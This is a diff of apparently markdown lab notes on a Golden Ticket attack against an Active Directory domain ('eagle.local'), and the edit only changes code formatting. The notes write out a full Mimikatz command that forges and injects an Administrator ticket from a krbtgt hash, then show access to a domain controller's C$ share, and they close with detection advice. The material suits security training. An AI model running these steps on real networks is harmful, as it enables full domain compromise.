@@ -231,18 +231,18 @@ PS C:\Users\bob\Downloads> Get-DomainSID
 
 3. Now, armed with all the required information, we can use Mimikatz to create a ticket for the account Administrator. The /ptt argument makes Mimikatz pass the ticket into the current session:
 
-```
+`
 mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
-```
+`
 4. The output shows that Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):
 
-```C:\Mimikatz>klist
-```
+`C:\Mimikatz>klist`
+
 
 5.To verify that the ticket is working, we can list the content of the C$ share of DC1 using it:
 
-```C:\Mimikatz>dir \\dc1\c$
-```
+`C:\Mimikatz>dir \\dc1\c$
+`
 
 *Detection*:Domain Controllers will not log events when a threat agent forges a Golden Ticket from a compromised machine. However, when attempting to access another system(s), we will see events for successful logon originating from the compromised machine. If we go back to the attack scenario, by running dir \\dc1\c$ at the end, we generated two TGS tickets on the Domain Controller: one for krbtgt and another for the Domain controller machine account. If SID filtering is enabled, we will get alerts with the event ID 4675 during cross-domain escalation.
 
